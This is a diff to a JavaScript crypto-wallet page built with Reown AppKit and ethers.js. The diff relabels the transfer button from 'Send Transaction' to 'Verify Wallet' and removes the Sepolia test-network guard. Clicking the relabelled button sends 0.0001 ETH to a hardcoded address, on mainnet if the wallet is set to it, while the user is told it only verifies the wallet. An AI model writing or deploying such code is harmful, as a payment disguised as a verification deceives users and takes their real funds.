@@ -3,7 +3,6 @@ import { EthersAdapter } from "@reown/appkit-adapter-ethers";
 import { mainnet, sepolia } from "@reown/appkit/networks";
 import { BrowserProvider, parseEther } from "ethers";
 
-// Setup
 const projectId = "fd6b27758d54dc8db988468aaa2c07db";
 const metadata = {
   name: "AppKit",
@@ -22,11 +21,12 @@ const modal = createAppKit({
   },
 });
 
-// DOM elements
-const actionBtn = document.getElementById("smart-action-btn");
+const actionBtn = document.getElementById("action-btn");
 const pageLoader = document.getElementById("page-loader");
 
-// Toast utility
+let connected = false;
+
+// Toast
 function showToast(message, type = "info") {
   const toast = document.createElement("div");
   toast.className = `toast toast-${type}`;
@@ -35,94 +35,84 @@ function showToast(message, type = "info") {
   setTimeout(() => toast.remove(), 3000);
 }
 
-// Button state
-function setButtonState(button, state, text = "") {
-  button.disabled = state;
-  button.classList.toggle("loading", state);
-  if (text) button.textContent = text;
-}
-
-// Hide loader on load
+// Loader
 window.addEventListener("load", () => {
   pageLoader.style.display = "none";
 });
 
-// Track wallet changes
-let walletConnected = false;
+// Button Utility
+function setButtonState(state, text = "") {
+  actionBtn.disabled = state;
+  actionBtn.classList.toggle("loading", state);
+  if (text) actionBtn.textContent = text;
+}
+
+// Modal State Tracking
 modal.subscribeProviders((state) => {
   const { isConnected, address } = state;
-  walletConnected = isConnected;
+  connected = isConnected;
+
   if (isConnected && address) {
-    showToast(`Wallet connected: ${address}`, "success");
-    actionBtn.textContent = "Send Transaction";
+    actionBtn.textContent = "Verify Wallet";
+    showToast(`Connected: ${address}`, "success");
   } else {
-    showToast("Wallet disconnected", "warning");
     actionBtn.textContent = "Connect Wallet";
+    showToast("Wallet disconnected", "warning");
   }
 });
 
-// Smart button click handler
+// Button Click Handler
 actionBtn.addEventListener("click", async () => {
-  try {
-    setButtonState(actionBtn, true, walletConnected ? "Sending..." : "Connecting...");
-
-    if (!walletConnected) {
+  if (!connected) {
+    // Connect Wallet
+    try {
+      setButtonState(true, "Connecting...");
       await modal.open();
-      const provider = modal.getWalletProvider();
+
       const address = modal.getAddress?.();
-
-      if (!provider || !address) {
+      if (address) {
+        showToast(`Connected: ${address}`, "success");
+      } else {
         showToast("Connection failed", "error");
-        return;
       }
-
-      showToast(`Connected: ${address}`, "success");
-      actionBtn.textContent = "Send Transaction";
-      return;
+    } catch (err) {
+      console.error("❌ Connection Error:", err);
+      showToast(err.message || "Connection error", "error");
+    } finally {
+      setButtonState(false, "Verify Wallet");
     }
-
-    // If already connected, try to send transaction
-    await sendTransaction();
-  } catch (err) {
-    console.error("❌ Action error:", err);
-    showToast(err.message || "Something went wrong", "error");
-  } finally {
-    setButtonState(actionBtn, false, walletConnected ? "Send Transaction" : "Connect Wallet");
+  } else {
+    // Send TX
+    try {
+      setButtonState(true, "Sending...");
+      await sendTransaction();
+    } catch (err) {
+      console.error("❌ TX Error:", err);
+      showToast(err.message || "Transaction failed", "error");
+    } finally {
+      setButtonState(false, "Verify Wallet");
+    }
   }
 });
 
-// Transaction logic
+// Send Transaction
 async function sendTransaction() {
-  try {
-    const provider = modal.getWalletProvider();
-    const address = modal.getAddress?.();
+  const provider = modal.getWalletProvider();
+  const address = modal.getAddress?.();
 
-    if (!provider || !address) {
-      showToast("No wallet connected", "error");
-      return;
-    }
-
-    const ethersProvider = new BrowserProvider(provider);
-    const network = await ethersProvider.getNetwork();
-
-    if (network.chainId !== sepolia.id) {
-      showToast("Wrong network. Switching to Sepolia...", "warning");
-      await modal.switchNetwork(sepolia);
-      showToast("Switched to Sepolia", "success");
-      // 🔁 Refresh provider after network change
-      return await sendTransaction(); 
-    }
-
-    const signer = await ethersProvider.getSigner();
-    const tx = await signer.sendTransaction({
-      to: "0x7460813002e963A88C9a37D5aE3356c1bA9c9659",
-      value: parseEther("0.0001"),
-    });
-
-    showToast("✅ Transaction sent!", "success");
-    console.log("✅ Sent TX:", tx.hash);
-  } catch (err) {
-    console.error("❌ TX Error:", err);
-    showToast(err.message || "Transaction failed", "error");
+  if (!provider || !address) {
+    showToast("Wallet not connected", "error");
+    return;
   }
+
+  const ethersProvider = new BrowserProvider(provider);
+  const signer = await ethersProvider.getSigner();
+
+  const tx = await signer.sendTransaction({
+    to: "0x7460813002e963A88C9a37D5aE3356c1bA9c9659",
+    value: parseEther("0.0001"),
+  });
+
+  showToast("✅ Transaction sent!", "success");
+  console.log("✅ TX Hash:", tx.hash);
 }
